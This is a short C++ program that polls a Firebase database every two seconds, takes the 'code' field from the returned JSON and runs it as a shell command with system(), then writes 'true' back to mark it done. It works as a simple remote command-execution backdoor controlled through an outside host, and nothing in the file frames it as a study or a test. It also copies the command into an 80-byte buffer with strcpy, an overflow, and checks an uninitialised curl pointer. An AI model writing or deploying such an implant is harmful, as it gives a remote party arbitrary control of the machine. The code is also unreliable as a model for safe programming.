#include <iostream>
#include <string>
#include <fstream>
#include <ctime>
#include <curl/curl.h>
#include "json/json.h"
#include "json/json-forwards.h"

using namespace std;

#define REFRESH 2


size_t getData(void *buffer, size_t size, size_t nmemb, void *userp)
{

	Json::Value root;
	Json::Reader reader;

	reader.parse((char*)buffer,root);

	string read = root.get("read","true").asString();
	if(read.compare("true") == 0)
	{
		cout<<"not executing";
		return size*nmemb;
	}

	string c = root.get("code","none").asString();
	char str[80];
	strcpy(str,c.c_str());
	system(str);

	return size*nmemb;
}

CURLcode writeData(CURL* curl,char* value)
{
	curl_easy_setopt(curl, CURLOPT_URL, "https://testproject-9ac78.firebaseio.com/testData/read.json");  
	curl_easy_setopt(curl, CURLOPT_CUSTOMREQUEST, "PUT");

	curl_easy_setopt(curl, CURLOPT_POSTFIELDS, value);
	CURLcode res;

	try{
		res = curl_easy_perform(curl);
	}
	catch(...)
	{
	}
	return res;
}

int main()
{

	CURL *curl;
	CURLcode res;
	time_t start,current;

	time(&start);
	while(true)
	{
		time(&current);

		if(current - start < REFRESH)
			continue;

		if(!curl) {
			return -1;
		}
		curl = curl_easy_init();
		curl_easy_setopt(curl, CURLOPT_URL, "https://testproject-9ac78.firebaseio.com/testData.json");
		curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
		curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, getData);

		res = curl_easy_perform(curl);
		if(res != CURLE_OK)
		{
			fprintf(stderr, "curl_easy_perform() failed: %s\n",curl_easy_strerror(res));
			return 1;
		}

		res = writeData(curl,"true");

		if(res != CURLE_OK)
		{
			fprintf(stderr, "curl_easy_perform() failed: %s\n",curl_easy_strerror(res));
			return 2;
		}
		curl_easy_cleanup(curl);
		time(&start);
	}
	return 0;

}
